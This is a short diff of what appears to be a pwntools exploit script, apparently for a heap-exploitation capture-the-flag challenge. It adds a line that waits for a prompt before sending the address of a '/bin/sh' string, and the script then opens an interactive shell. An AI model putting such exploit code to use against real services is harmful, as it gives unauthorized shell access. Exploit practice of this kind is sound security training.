@@ -169,6 +169,7 @@ allocate(0x20, data)
 #allocate(bin_sh_addr, '1234')
 
 r.send('1')
+r.recvuntil(':')
 r.send(str(bin_sh_addr))
 print('')
 r.interactive()
